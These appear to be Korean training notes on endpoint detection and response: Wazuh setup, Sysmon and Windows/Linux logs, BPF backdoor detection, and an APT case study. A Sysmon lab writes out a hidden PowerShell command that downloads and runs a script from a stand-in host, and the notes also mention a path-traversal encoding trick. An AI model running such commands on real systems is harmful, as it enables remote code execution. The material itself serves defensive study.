- Volume Shadow Copy(VSS) 삭제 → 복구 불가 상태 유도
- LockBit 등 최신 랜섬웨어는 감염 기간이 길수록 유실 가능성 증가

#### Anti-Ransomware 대응 메커니즘
```plain text
[실시간 탐지 트리거]
I/O 급증 + 메타데이터 변경 패턴 감지
    → 임계치 초과 시 랜섬웨어로 판단
    → 즉시 프로세스 차단

[실시간 백업 / 롤백]
VSS(Volume Shadow Service) 활용 — Windows 8 이후 기본 지원
    → 에이전트 스케줄 백업으로 주기적 스냅샷 생성
    → 저장공간 자동 관리
    → 랜섬웨어 동작 감지 시 암호화 이전 스냅샷으로 즉시 롤백
```
> 탐지 트리거 — I/O 급증 + 메타데이터 변경 패턴의 임계치. 실시간 백업본이 없으면 롤백 불가이므로 스냅샷 주기 관리가 중요.

#### Wazuh + BlackBasta 랜섬웨어 실시간 대응 시나리오

1. 랜섬웨어 동작 시작 (대량 파일 암호화)
1. Wazuh가 I/O 패턴 + 이벤트로 탐지
1. 암호화된 파일 삭제
1. 에이전트 스냅샷 백업본으로 복구

### 10. EDR 전체 구조 요약
```plain text
수집 (Agent)
  파일 / 프로세스 / 모듈 / 네트워크 / 레지스트리
      ↓
탐지 (서버 분석 엔진)
  AV 시그니처 → IOC → ML → 평판/유사도 → 행위 기반
      ↓
대응
  프로세스 종료 / 네트워크 격리 / 포렌식 / 롤백
      ↓
가시성
  타임라인 / 체인트리 / 대시보드 / AI 분석
```


## MDR · 국가배후 APT · BPF Backdoor · 서버 EDR-Day1

## 2026-05-13 교육 수강 노트

### 1. MDR (Managed Detection & Response)

EDR을 직접 운영하기 어려운 조직을 위해 보안 전문 업체가 탐지·대응을 대신 운영해주는 서비스.

#### 제공 내용

- 데일리 리포트 — 전날 탐지된 위협·이벤트 요약
- 먼슬리 리포트 — 월간 위협 트렌드·통계·개선 권고
- 위협 분석 보고서 — 국가 배후 APT 등 고도 위협 발생 시 심층 분석

#### MDR 담당 직군

- SOC 분석가 (Alert 1차 분류·대응)
- 위협 헌팅 전문가 (숨겨진 위협 능동적 탐색)
- 포렌식·사고대응(IR) 전문가
- 보고서 작성·컴플라이언스 담당

### 2. 국가 배후 APT (Advanced Persistent Threat)

단순 범죄 집단과 달리 국가 지원을 받아 장기간 지속적으로 침투하는 고도화된 위협.

#### 특징

- 탐지를 피하기 위해 정상 도구·프로세스 악용 (LotL)
- 수개월~수년간 내부에 잠복하며 정보 수집
- 특정 산업·기관(방산, 에너지, 금융, 외교)을 표적으로 삼음
- 독자적인 악성 도구셋과 TTP 보유 → MITRE ATT&CK에 그룹별로 등록됨

#### Dwell Time — 침해 체류 시간
> "공격자가 내부에 침투한 시점부터 탐지되기까지 걸리는 시간"

- NTT/Trend 리포트 기준 — 작년 평균 약 10일
- EDR 도입 전: 수십~수백일이 일반적
- EDR이 있으면 Dwell Time을 대폭 단축 가능 → 피해 범위 최소화로 직결

### 3. 서버 EDR — PC EDR과의 차이점

#### PC EDR vs 서버 EDR
> 핵심 — 서버는 서비스 연속성이 최우선. 탐지는 하되 자동 격리·프로세스 종료 같은 대응은 사람이 판단 후 수동으로 실행.

#### 구축 방식 차이

금융권 K사 — 파일럿 배포

- 전체 배포 전 소규모 파일럿으로 영향도 검증
- 충돌·성능 저하 여부 확인 후 단계적 확대

SGI 사례 — 선(先) 배포 후 이슈 대응

- 에이전트 배포 대상 서버에 먼저 배포 진행
- 이후 확인된 이슈에 대해 순차적으로 대응

#### 서버 EDR 도입 기대효과

### 4. BPF Backdoor — 탐지 회피의 끝판왕

#### BPF란?

BPF(Berkeley Packet Filter) — 원래는 Linux 커널에서 네트워크 패킷을 필터링하기 위한 정상 기술.

- Wireshark 같은 패킷 분석 도구가 내부적으로 사용하는 바로 그 기술
- 특정 종류의 네트워크 트래픽만 선택적으로 볼 수 있게 해주는 필터 개념
- Linux가 제공하는 정상 바이너리·기능

#### 공격자가 BPF를 백도어로 악용하는 이유

무통신 방식 (Passive 수신)

- 패킷 수신 전용 → 네트워크 흔적을 남기지 않음
- 일반적인 네트워크 연결(TCP 핸드쉐이크)이 없으므로 IDS/IPS 탐지 불가
- Magic Packet 방식으로 트리거 — 특정 패턴의 패킷이 도착할 때만 활성화

#### BPF Backdoor 탐지 회피 기법

#### SK EDR의 BPF 탐지 사례

- 초기에는 서버 EDR 도입 자체가 어려웠음 — Windows 위주였기 때문
- BPF 백도어 사용 초기에는 정상으로 분류됨
- 지속적으로 이름을 바꾸고 조건을 추가하며 탐지 회피
> 핵심 인사이트 — BPF Backdoor는 정상 OS 기능을 악용하기 때문에 기존 보안 솔루션으로는 탐지가 거의 불가. 행위 기반 + Opcode 패턴 + Magic Packet 식별의 조합이 필요.

프로세스 이름 기반 탐지의 한계

- bpflaod 같은 이름으로 탐지 룰을 만들면 → 공격자가 탐지된 것을 인지하고 즉시 프로세스 이름을 변경
- 이름 기반 탐지는 공격자가 이름만 바꾸면 무력화됨
- 이름 변경 + 추가 조건 변경을 반복하며 지속적으로 탐지 회피

해결책 — 이름이 아닌 "태그(특징)"로 탐지

- 프로세스 이름이 바뀌어도 변하지 않는 코드 수준의 특징에 태그를 붙여 추적
- 이름이 무엇이든 상관없이 해당 특징이 있으면 탐지

결국 아래 두 가지 방식으로 탐지 성공:

- Opcode 패턴 기반 탐지 — 코드 실행 패턴(명령어 바이트 시퀀스) 자체를 시그니처화. 이름이 바뀌어도 코드 구조는 동일하므로 탐지 유지
- Magic Packet 식별 — BPF를 깨우는 특정 패킷 패턴을 식별. 트리거 자체를 탐지
> 핵심 인사이트 — 이름 기반 탐지는 공격자가 이름만 바꾸면 끝. 탐지 회피에 강한 방법은 프로세스 이름이 아니라 코드의 행위·구조·패턴에 태그를 붙이는 것. 이름은 바꿀 수 있어도 코드의 동작 방식은 쉽게 바꾸기 어렵다.


## 샌드박스 vs EDR vs 백신 — 탐지 계층 비교-Day1

## 2026-05-13 교육 수강 노트

### 1. 세 솔루션의 역할 분리

### 2. 샌드박스 — 동적 분석의 강점과 한계

#### 동작 방식

의심 파일을 격리된 가상 환경(OS 포함)에서 실제로 실행해 악성 행위를 관찰하는 동적 분석 방식.

- OS까지 통째로 구동하기 때문에 무겁고 오래 걸림
- 분석 결과가 나오기까지 딜레이 발생 → Delayed Detection
- 네트워크 뒷단(게이트웨이 레벨)에 위치 — 이미 내부로 들어온 파일은 커버하지 못함

#### 샌드박스의 한계

실환경과의 차이

- 샌드박스는 격리 환경이므로 실제 운영 환경과 다를 수 있음
- 공격자들이 이를 인식하고 샌드박스 환경을 감지하면 악성 행위를 숨기는 기법 사용

Delayed Attack (지연 공격)

- 샌드박스 분석 시간 동안은 정상처럼 동작하다가, 분석이 끝난 뒤 악성 행위 시작
- 샌드박스가 탐지하지 못하고 통과시킨 뒤에야 공격 발생

OS 감지

- 요즘 공격자들은 샌드박스 OS 버전·환경을 확인하고 회피
- "이 환경은 샌드박스다"라고 판단하면 악성 행위를 아예 실행하지 않음

#### 샌드박스가 커버하지 못하는 영역
```plain text
[ 외부 인터넷 ]
      ↓
[ 게이트웨이 / 샌드박스 ] ← 여기서 탐지 시도
      ↓ (통과된 파일)
[ 내부 네트워크 ]
      ↓
[ 엔드포인트 / 서버 ] ← 뒷단에는 백신만 있음
                         → EDR이 없으면 사각지대
```
> 샌드박스를 통과한 파일이 엔드포인트에서 실행되면 뒷단에는 백신밖에 없다. 백신은 파일리스·행위 기반 공격에 무력 → EDR이 반드시 필요한 이유.

### 3. EDR — 엔드포인트 내부의 실시간 탐지

샌드박스가 커버하지 못하는 영역을 EDR이 담당.

- 파일이 실제 엔드포인트에서 실행되는 순간부터 행위를 실시간 모니터링
- 파일리스 공격, 메모리 인젝션, LotL 모두 탐지 가능
- 샌드박스를 우회한 공격도 EDR에서 잡힘

### 4. 샌드박스 + EDR — 둘 다 필요한 이유

#### 상호 보완 구조
```plain text
[ 샌드박스 ]              [ EDR ]
게이트웨이 레벨           엔드포인트 레벨
알려진 악성 파일 차단     실행 후 행위 탐지
딜레이 있음              실시간
정적+동적 분석           행위 기반
```

- 샌드박스: 들어오기 전에 걸러내는 역할
- EDR: 들어온 후에 실행 행위를 감시하는 역할
- 둘은 대체 관계가 아니라 레이어를 나눠서 커버하는 상호 보완 관계

#### 현실
> "샌드박스와 EDR 둘 다 필요하지만, 꼭 둘 다 있는 것도 아니다."

- 예산·우선순위에 따라 둘 중 하나만 있는 경우가 많음
- 샌드박스만 있으면 엔드포인트 내부가 사각지대
- EDR만 있으면 게이트웨이 레벨 필터링이 없음
- 이상적인 구성: 샌드박스(앞단) + EDR(뒷단) + 백신(기본) 3계층

### 5. 전체 보안 레이어 구조
```plain text
[ 외부 위협 ]
      ↓
┌─────────────────────────────┐
│  게이트웨이 레이어           │
│  - 방화벽 / IPS             │
│  - 샌드박스 (동적 분석)     │  ← 알려진 위협 차단, 딜레이
└─────────────────────────────┘
      ↓ (통과된 위협)
┌─────────────────────────────┐
│  엔드포인트 레이어           │
│  - 백신 (시그니처)          │  ← 알려진 파일 기반 탐지
│  - EDR (행위 기반)          │  ← 파일리스·LotL·실행 후 행위
└─────────────────────────────┘
      ↓ (탐지된 위협)
┌─────────────────────────────┐
│  대응 레이어                │
│  - SOAR 플레이북            │
│  - MDR (관제)               │
│  - 포렌식·IR                │
└─────────────────────────────┘
```

### 6. 한 줄 정리


## 

국가 배후 apt

위협분석 보고서

mdr ㅡmanaged defense response

데일리 먼쓰리 리포트 제공 직군

서버 edr 가시성 확ㅂㅎ 서버 침해 사고 조가탐지 사고 대응 및 포렌식  역량 확보 컴ㅍ,라이언스

기대효과

보안체계완성

사고 대응 시간 단축

사고영향 범위 최소화

보안 수준의 정량적 증명

dwelltime

ntrend 리포터 - 드웰타임 작년10일

하지만edr이 있어 줄임

edr이 있어 잘라질 수 있어서 범위최소화가능

우리가 얼마나 볼수 있는지 증명

pc edr과 서버 edr의 차이점

메트릭어텍은 운용체계에 따라 메트릭이다르다.

BPF berkeley packet filter Door back door

wireshark같은

리눅스에서 제공하는 바이러니 파일

필터개념

특정한 종류의 네트워크 종류만 ㅂ로수 있다.

목박는 이유- 무통신 방식 패킷수신전용 네트워크 흔적을 남기지 않음

bpf기술 악용 정상적인 라뉵스 사용 시스템에 흔적이 없음

보안솔류션 탐지회피 실향 후 백그라운드 은익 프로세스이름위장 트리거 모름

정적분석 회피 메로리에서 직접 실행 유동적인 포트번호 패턴변경

sk의 edr서버는 처음에는 도입되지 어려움 윈도우 위주였기때문에

이름을 바꿈 bpf 사직까지는 정상 핮미ㅏㄴ 계속해서 이름을 바꾸고 다른 조건을 붙임… 예를 들면 리버스 커넥션-우너격 연결행위자체를 탐지 왜냐하면 필터링의 역활에 필요가 없다. bpglaod 같은 태크붙임

트리거를 모르고 바뀜 opcode 패턴을 기반으로 /  magic packet을 식별하여 탐지

구축의차이

- 금융권 k 파일럿 배포
- sgi의 경우는 에이전트 배포 대상 서버에 선 배포 진행 이후 확인된 이슈에 대한 대응
- 서버는 서비스가 죽으면 안됨 그래서 탐지정책을 사용하지만 대응 정책은 사용안됨

edr vs apt vs 백신

샌드박스 의 동적분석 - os까지 만들기 때문에 무겁고 오래걸리고 작용까지 한다. 실환경과 차이가 있을 수 있다. 위치가 다름… 샌드박스는 뒷쪽에서 탐지  딜레이드 어텍 , 요즘은 os를 본다.  그래서 뒷단에는 백신만 있기 때문에 edr이필요하다., 그래서 샌드박스 edr둘다 필요하지만 꼭 둘다 있는 것도 아니다.


## 

Mythos

elk에서 출발한 wazuh

index -elastic search

server - logstach

dashboard -kibana

wazuh는 agent가 rule을 갖고 있다.

작동 과정

와주의 agent와 server간의  - sion 를 따로 만든 회사의 경우 정보를 모두 평문처리되어서 edr에서 다 수집되고 있는 경우도 있었음.

스니핑

mitm 막기위해

에이전트 다양한 os지원

solaris unix도 가능

fim을 12시간마다하는 것은 굉장히 과부하

루트킷은 도구들의 모음

와주는 cv 정보를 제공한다 버전 정보가 있으니껀 db에서 긁어오면 되긴하다.

filebeat는 엘라스틱서치에서 사용하는 개념 이를 통해서 indexer을 전송한다.

스케일아웃을 하면 분리된 서버로 이루어지지만 masternode만 보면 된다. gui롤만 보여주는 롤만 추가하면된다.

클러스트링 구조

인덱서는 뽑아주는것 nosql 인덱서안 샤드 - 인덱싱작용을하고 샤드에 무작위로 저장이 되고 찾을 때는 병렬로 모든 샤드로 검색을 한데 이 방법이 빅데이터에서는 rds보다 훨씬 빠르다.

rds

디코드는 정보를 가공하는 방식

원래는 EDR하나만 있으면 되는데

만약에 안랩처럼 DER이 모듈이 되어있으면 종속성의 문제가 필요하고 서드파티가 필요하고 리소스사용량이 늘어난다. 이전의 정보가 재가공되어햔다.

그래서 몽고DB였기 때문에 다른 것고 맞지않아 NOSQL을 사용하기 시작함

하지만 전체 DB는 복합적으로 구성함

process monitor

> 📷 Ubuntu 실습 VM에서 `ping -c 3 192.168.1.70` 100% 손실 확인 후 `systemctl list-units --type=service | grep wazuh` → wazuh-dashboard, wazuh-indexer, wazuh-manager 모두 active running.

> 📷 Wazuh 매니저 기본 ossec.conf(ubuntu 22.04): global(jsonout_output·alerts_log yes, logall no, 이메일 알림 no, agents_disconnection_time 10m), alerts(log_alert_level 3, email_alert_level 12), logging plain, remote(connection secure, port 1514, protocol tcp, queue_size 131072).
```text

```

udp를 보내는 경우도 있고

tpc가 아니여도 되는 이유는 우선 tcp로하고 udp로 한다.

> 📷 ossec.conf의 remote 블록 확대: secure 연결, 1514 포트, tcp 프로토콜, 큐 크기 131072. 이어서 rootcheck(disabled no, check_files yes) 정책 모니터링 블록.

> 📷 rootcheck 블록: check_files, check_trojans, check_dev, check_sys, check_pids, check_ports, check_if 모두 yes — 루트킷·트로이목마 파일, /dev, 숨은 프로세스·포트, 무차별 모드 인터페이스를 검사.

rootkit보는것

12시간마다 찾도록 설정이 되어있음

> 📷 rootcheck 주기 frequency 43200초(12시간), 시그니처 파일 etc/rootcheck/rootkit_files.txt, rootkit_trojans.txt.

> 📷 syscheck(FIM) 블록: disabled no, frequency 43200(12시간), scan_on_start yes, alert_new_files yes(새 파일 생성 시 알림), auto_ignore frequency=10 timeframe=3600 no(자주 바뀌는 파일도 무시하지 않음).

안쓸건지 물어봄

> 📷 Log analysis localfile 예: `df -P`를 command 형식으로 360초마다 실행, `netstat -tulpn` 결과를 sed로 가공해 full_command 형식(alias "netstat listening ports")으로 360초마다 수집 — 열린 포트 변화 감지용.

이런 format으로 룰만들어줘야한다.

> 📷 indexer 블록: enabled yes, host https://127.0.0.1:9200, SSL 인증서는 /etc/filebeat/certs/의 root-ca.pem, wazuh-server.pem, wazuh-server-key.pem.

local주소

> 📷 wazuh-authd(에이전트 등록) 설정: port 1515, use_source_ip no, purge yes(같은 이름 재등록 시 기존 정보 정리), use_password no, ciphers HIGH:!ADH:!EXP:!MD5:!RC4:!3DES:!CAMELLIA, ssl_verify_host no. 아래 cluster 블록은 name wazuh, node01, master.

purge는 중복된 부분을 어떻게 하겠나? 정하는 부분

> 📷 WebSrv(Ubuntu 22.04)의 Wazuh 에이전트 ossec.conf: server address 192.168.1.100, port 1514, tcp, config-profile ubuntu22.04, notify_time 10, time-reconnect 60, auto_restart yes, crypto aes. client_buffer queue_size 5000, events_per_second 500. rootcheck 항목들 yes.

> 📷 실습 Desktop(Windows) 이벤트 뷰어 개요: 최근 1시간 Warning 8건, Information 249건. 로그 요약에 Windows PowerShell 15MB, System 6MB, Security 약 977MB.

> 📷 Security 로그 846,019건, 대부분 이벤트 4703(A token right was adjusted, Token Right Adjusted Events, Audit Success) — SYSTEM 계정이 토큰 권한을 조정한 기록이 초 단위로 대량 발생.


## Windows 이벤트 로그 분석 정리

### 1. Windows Security 로그 vs Sysmon 로그 비교
> 핵심 차이: Security 로그는 "뭔가 일어났다" 수준.

Sysmon은 누가, 무엇을, 어떻게, 어디서 호출했는지 체인을 재구성할 수 있다.

### 2. 주요 Event ID 정리

#### Windows Security 로그

#### Sysmon 로그

### 3. 실습 로그 분석 — 의심 패턴

#### 3-1. Sysmon 로그 (Microsoft-Windows-Sysmon/Operational)

- 총 이벤트: 63,246건
- 주요 관찰:
  - EID 1 (Process Create) 다수 — 프로세스 실행 체인 추적 필요
  - EID 22 (DNS Query) 3건이 08:18:03~08:18:34 사이에 클러스터링
    - Process Create 이벤트와 타임라인 겹침 → C2 비콘 패턴 의심

#### 3-2. Windows Security 로그

- 총 이벤트: 848,125건 (노이즈 매우 많음)
- 주요 관찰:
  - EID 4703 (Token Right Adjusted) 이 08:25:08~08:25:28 사이에 대량 반복 발생
    - 토큰 권한 조정이 짧은 시간 내 반복 → T1134 (Access Token Manipulation) 의심
  - EID 4689 (Process Terminated) 동 시간대 발생

### 4. 연계 분석 포인트
```plain text
Security 로그 EID 4703 대량 발생 (08:25:xx)
        ↕ 타임라인 교차 확인
Sysmon EID 1 — 해당 시간대 어떤 프로세스가 실행됐는가?
        ↕
Sysmon EID 22 — DNS 쿼리 대상 도메인 확인 → C2 여부 판단
```

#### EID 1 분석 시 반드시 확인할 필드

### 5. ATT&CK 매핑 (추정)

분석 환경: XDR 실습 가상머신 / Windows Event Viewer

로그 수집: Sysmon64 + Windows Security Auditing

Sysmon EID 전체 정리

공격 시나리오별로 주로 보는 EID

- C2 통신: 3 (네트워크) + 22 (DNS)
- Process Injection T1055: 8 (RemoteThread) + 10 (ProcessAccess)
- 권한 상승: 1 (부모-자식 체인) + 10
- persistence: 13 (레지스트리) + 11 (파일 생성)
- LSASS 덤프: 10 (ProcessAccess where TargetImage=lsass.exe)


## Day2

http://www.itdaily.kr/news/articleView.html?idxno=239216
```plain text
로그의 4가지 핵심 구성
1. 수준(Level) : 사건의 경중
- 정보(Information)
- 경고(Warning)
- 오류(Error)
- 위험(Critical)
2. 누가/무엇이(Source)
3. 언제(Date/Time)
4. 이벤트 ID : 사건마다 부여된 고유 번호
```

윈도우 로그

3 + application service log
```plain text
주요 이벤트로그 이벤트 ID
1. 4624 (Security)
의미 : 로그인 성공
공격자가 처음에 크린덴셜 붙여서 접근할때 .. 시도를 많이할꺼니깐.. edr 임계치를 만들면 된다. 
2. 4625 (Security)
의미 : 로그인 실패

3. 4688 (Security)
의미 : 프로세스 생성
프로세스 동작 정보

4. 7045 (Sysyem)
의미 : 서비스 설치

```

> 📷 System 로그 속성: 경로 %SystemRoot%\System32\Winevt\Logs\System.evtx, 크기 6.07MB, 최대 크기 1,000,000KB, 가득 차면 오래된 이벤트부터 덮어쓰기(보관·수동 삭제 옵션도 있음).

덮어쓰기 선택 신중

저장량은 문제가 되지 않지만 이벤트가 생성되는 속도에 의해 영향을 받고

복구 작업 과정에서 속도가 영향을 받는다.

로그는 지우면 복구가 안된다.

sysmon

sysinternals에 포함된 optional한 것

eventlog는 굵직한 것만 알려주고

sysmon은 전방위적인 데이터를 찍는 것. EDR탐지와 비슷함

> 📷 Sysmon 이벤트 ID 3(Network connection detected): svchost.exe(PID 3920, NT AUTHORITY\LOCAL SERVICE)의 UDP 연결, Initiated false. Microsoft-Windows-Sysmon/Operational 로그에서 Event ID 3으로 필터링.

timestamp를 보면 공격자가 시간을 바꾸기 위해 한 행위의 정보를 syslog를 통해 수집할 수 있다.

백신은 서명을 보고 헤타를 보지만

sysmon은 행위를 본다

> 📷 실행 창에 services.msc 입력 — 서비스 관리 콘솔 열기.

> 📷 services.msc에서 Sysmon 서비스 속성: 서비스 이름 Sysmon(System Monitor service), 실행 파일 C:\Windows\Sysmon.exe, 시작 유형 자동, 상태 Running.

> 📷 Sysmon 이벤트 ID 1 탐지 실습: 관리자 cmd에서 `powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://evil-site.com/malware.ps1')"` 실행 → Sysmon/Operational에 Event 1 기록(Description Windows PowerShell, CommandLine 전체, User DESKTOP-…\user). 수업노트 정리: 로그 핵심 4요소(수준·출처·일시·이벤트 ID), 주요 ID 4624 로그인 성공, 4625 실패, 4688 프로세스 생성, 7045 서비스 설치. -WindowStyle Hidden=은닉, DownloadString=유입, IEX=실행.

리눅스

journald

init syslog 는 텍스트 기반으로 적기 때문에 느리고 놓치는 부분도 있다.

rsyslogd 여러 개가 동시에 기록, udp로 보내는 syslog보다 tcp를 지원받기 때문에 안정적

centos7이후로는 init 대시 systemd가 나왔다. 총사령관 - 비서가 journald

일인식당의 손님 init과 처리로직

systemd는 병렬처리 많은 식당의 많은 손님 시스템 처리속도는 빨라졌지만 유지도구가 많아야하고 등등 여러가지 요소때문에 유지비용이 많이든다. 특히 요즘 클라우드 환경에서는 민간한 단잠 ios디바이드.. 같은 경량의 펌웨어들은 systmed로 올리기는 너무 부담스럽워 cent os7도 사용이된다.
```plain text

[84 page]
리눅스 로그

1. init (과거/CentOS 7 미만의 대장)
- 방식 : 직렬 방식 처리(하나씩 하나씩)
- 장점 : 단순함, 가벼움(여전히 IoT 장비나, 도커 환경에서는 이용되고 있음)
- 단점 : 부팅 속도가 매우 느림

2. systemd(현재/CentOS 7 이상의 대장)
- 방식 : 병렬 방식 처리(다 같이 시작)
- 장점 : 압도적인 속도, 부팅 속도, 강력한 관리 기능
- 단점 : 덩치가 큼(요구하는게 많음), 복잡함
```

journald 는 바이너리 파일의 형태 , 검색에서도 인덱싱 기능이 있어서 원하는 부분만 찾을 수 있고 바이너리파일이라서 보안상 좋다.

stdout 자동 기록 - 이전에는 경로를 만들고해서 하드코딩을 해야 저장을 해야하고 일시적으로 죽으면 기록이 안된다. 이것은 즉시 자동으로 하기때문에 잃어버릴 일이 없는 장점 실시간으로 기록하기 때문에

syslog는 평문이고 그냥 순차 검색

journald 단점이있어 rsyslog를 병행 - 모든 회사가 최신일 수가 없어서 syslog를 쓰는 경우가 많은데 이 두 시스템에서 공유해할 때를 대비해서 rsyslog도 같이 평문으로 또 기록해서 필요할때 전송하낟

리눅스에서 관리자로 실행해도 계정정보를 알 수가 있다.

auditd는 시스몬처럼 하도록 도와준다.

kernel는 가장 아래있는 것

하드웨어적 리소스와 소프트웨어사이를 이어주는 가장 하단의 위치에서 작동을 하는 존재인데 audit는 여기까지 내려가서 정보를 수집한다. 정밀함

크라우드스트라이크도 커널레벨에서 활동을하는데 업데이트 중에 커널레벨에서 실수를 해서 블루스크린 무한리부팅만되어서 많은 혼란을 야기함

커널 내부에 위치한 것은 아니고 바로 위엥있다. audit의 위치

민감하고 세밀한 행위

redhat 7.6 ebpf 라는 것으로 오딧티가 계랑이 되었다. 커널안에서 약간 돌아다니면 관찰가능 그냥 보는 것이 아니다.

커널레벨에서 동작을한다(커널을 볼 수 이ㅣㅆ다)vs 커널에서 동작을 한다.(커널안에서 동작을 한다)
```plain text
90 page]
1. auditd (전통적인 수사관)
리눅스 커널의 표준 감사 프레임워크 : 어떤 사용자가 파일을 열었는가?
동작 방식 : 커널 내부에 미리 정의된 규칙에 따라 이벤트를 기록
장점 : 거의 모든 리눅스에 기본 내장, 안정성이 뛰어남, 설정이 굉장히 단순한편
단점 : 규칙이 많아지면 안됨 > 많아지면 느려짐(고성능을 요구하는 고부하 서비스에는 부적합)
         우회가능성이 상대적으로(eBPF대비) 쉬움

2. eBPF (차세대 요원)
동작 방식 : 커널 안으로 작은 코드(샌드박스) 주입하여 실시간 데이터를 확인 및 가공
장점 : 커널 공간에서 일을 처리하므로 빠르고 효율적(auditd 대비)
         네트워크 관련 정보나 메모리 관련 정보를 세밀하게 들여다볼 수 있음
단점 : 최신 커널 버전이 필요
         복잡함....
```

### apache

애플리케이션 레벨의 로그

보통의 warhole처럼 웹사이트 공격으로 시작하는 경우가 많다.

공격자가 접근하면 기록에 남는다.

> 📷 웹 서버 /var/log/apache2 목록: access.log, access.log.1, error.log, error.log.1~14.gz(로테이션 후 압축), other_vhosts_access.log.

other_vhosts_access.log 는 가상머신 에러로그

자기들이 약속한 로그포맷이 있다.

> 📷 access.log 내용(Combined 로그 포맷): 192.168.1.70이 /simplesite/register.php POST → login.php → main.php → dashboard.php 순으로 접근, 응답 코드 200/302/404(favicon), Referer와 Chrome 134 User-Agent 포함.

access.log access.log.1

로그로테이션으로 데이터를 저장하는 방법

크기가 크지는 경우에는 분할되어 백업형식으로 저장이되고있다.

일반적으로 get 이랑 post 말고 put같은게 찍혀있으면 …

../ 상위로 올라가자는 명령어가 보안이 약한 경우 되는데  이 것을 %2e% 로 인코딩하면 뚫릴 수도 있다.

대량 고빈도 요청

bpf와 구분 완전히 다른 것이다.

> 📷 `journalctl _COMM=sudo` 결과: pam_unix(sudo:auth) authentication failure(uid=1000 user) 후 sudo 세션 열림/닫힘, 실행 명령(COMMAND=/usr/bin/journalctl …) 기록 — 권한 상승 시도와 실행 명령 추적 가능.

### 사후대응

정상적인 프로세스에 인젝션시키는 것이 일반적이므로 A.exe 안을 보는 것이 중요하다.

live분석 dump분석

live환경에서 해야 다 볼 수 있다.  툴을 설치해야해서 기존의 기록에 영향을 줄 수 있는 단점이 있지만 필요가 있다.

파일배포 기능이 해킹당하면 악성코드가 다 뿌려질 수가 있다.

dump를 통해 하면 여러가지 분석을 시도할 수 있다는 장점은 있지만 라이브러리에서만 볼 수 있는 자료는 못본다.

프로세스 이름

부모 자식 관계

실행 경로

명령 라인

리소스 사용률 - cpu memory gpu 까지 체크

실행 및 종료

정상적인 것을 모두 암기해야할 필요있다.

pid

ppid

속성에 보면 버전 정보 같은거는 다지털 서명과는 달리 간단하게 적어놓은 것이라느 개념이지 인증같은 것의 의미는 아니다.

sans

> 📷 SANS DFIR 'Hunt Evil' 포스터: 왼쪽 'Find Evil – Know Normal'은 System, smss, wininit, services, svchost, lsass, explorer 등 정상 윈도우 프로세스의 경로·부모·인스턴스 수·시작 시간·사용자, 오른쪽 'Lateral Movement'는 RDP·공유 폴더·PsExec·예약 작업·서비스·WMI·PowerShell Remoting별로 출발지/목적지에 남는 이벤트 로그·레지스트리·파일 흔적 정리.

> 📷 SANS DFIR 'Windows Forensic Analysis' 포스터: 파일 시간 규칙($STANDARD_INFORMATION/$FILENAME), 그리고 증거 유형별 아티팩트 — 파일 다운로드, 프로그램 실행(Prefetch, Amcache, Shimcache, UserAssist, BAM/DAM), 파일·폴더 열람(LNK, Jump List, ShellBag), 삭제 파일, 네트워크 활동, 외부 USB 장치, 계정 사용(로그온 유형·이벤트 ID), 브라우저 사용.

svchost 는 서비스를 담아주는 그릇 역활을 한다.

svchos.exe -k 위장이 가능핟.

아주 수가 많음 .

dll에 관련된 모든 서비스를 보두 svchost로 연결함

lsacc에서 권한 상승이 가능하고 숫자는 한개 뿐 크린데셜고나련 프로세서

경로는 systemc32, 경로 winint.exe

그래서 위의 것이 있으며나 안좋은 것

exploer.com

> 📷 WebSrv 에이전트 ossec.conf localfile 추가: apache 형식으로 /var/log/apache2/error.log, access.log 수집, syslog 형식으로 /var/ossec/logs/active-responses.log, /var/log/dpkg.log 수집.

이벤트 로그 안가져오는 설정

> 📷 윈도우 에이전트 ossec.conf의 Security eventchannel query: EventID 5145, 5156, 5447, 4656, 4658, 4663, 4660, 4670, 4690, 4703, 4907, 5152, 5157 등을 제외 — 대량 발생하는 객체 접근·필터링 플랫폼·토큰 조정 이벤트를 매니저로 보내지 않는 설정(앞서 본 4703 대량 발생과 연결).

시스몬 탐지루ㅠㄹ이 없다.

시스몬에서 보통 level 0,1인경우엔느알람이 울리지 않는다.,
```plain text

132 ~141 page
SSH연결 및 해당 로그 확인 실습

[149 page]
sysmon 주요 이벤트 ID(79페이지 참조)

1. Event ID 2
- File Creation time
- 파일 생성 시간 조작 감지

2. Event ID 5
- Process Terminated
- 프로세스 종료 / 악성코드가 흔적을 지우고 사라졌는지 확인....

3. Event ID 7
- Image Loaded
- 특정 dll 파일을 로드한 내용 / 권한 상승이나, 인젝션을 탐지

1) Agent ID가 007인 에이전트의 이름과 IP는 무엇입니까?

2) 현재 수집된 로그 중에서 "위협 레벨(rule.level)"이 12이 이상인 것은 총 몇 건 입니까?
** 검색 기간은 5월10일부터로 설정

3) 출발지 IP가 192.168.1.70인 로그 중에서 로그인을 성공(Authentification Success)한 로그의 rule.id는 무엇입니까?
출발지 IP : data.srcip
rule.description

```

디코더 : 데이터를 정제하는 역활

프리디코더 단계가 있어서 어떤 디코더를 사용할지 정해준다.

161페이지 프리디코더의 단계에서sshd가 있는 디코더에 가서 해

심각도는 15까지 0,1,2는 wazuh는 무시 rulset말고 etc 밑으로 만든 룰을 저장 롤아이디의 충돌을 막기위해 100000

if 사전체크

samscrip 한 서버에서 나온 결과일때

if sid

if group

if matched sid

cyber kill chain

‣

전세계 공격기법을 나열해서 카테고리화함

mitre att&ck

evaluation

평가항목이 edr에서 xdr까지 넘어가서 평가받기가 더 어려워짐

ttp tactics thread process

https://www.boannews.com/media/view.asp?idx=123497

특단의 조치로 해시값을 백신에 넣버림

얼노사끼리 모니터링 언론사 가 취약한 경우많고 감염이 도미ㅕㄴ 서로다됨 공공기간에서 기사 언론접속

악성ㅁ코드에 설치프로그램 스캔 매직라인 발견

c2 서버에서 행위 공격

공공기간까지 감염

공공기간은 내부망이고 공공기간에서 망간 전송

이곳에 취약한 점을 발견하고 내부에 침투하고 자료를 수집 중에 백신에 걸림

edr의 경우에는 처음에는 수집만하고 환경에 룰을 최적화 시켜서 알람을 울리지 않는다. 그래서 탐지를 ..

망간 전송 자료 전송 솔루션에 아무런 보안이 안된것이 문제

edr에 command라인이 남아있어서 그대로 적용해서 취약점을 재현함

취약저밍 패치 된프로그램의 정상 도앚ㄱ을 확인

매직라인의 정상적인 동작 로직은  자기자기산만  트래픽도 인증만하니깐 1000kb미만 포트도 한두가지

하지만 실제로 확인해보니 c2 ip가 찍혀있고 350mb의 데이터가 나감

매직라니인이 시행되면서 자식 프로세스를 작동시켜서 자료가 나감

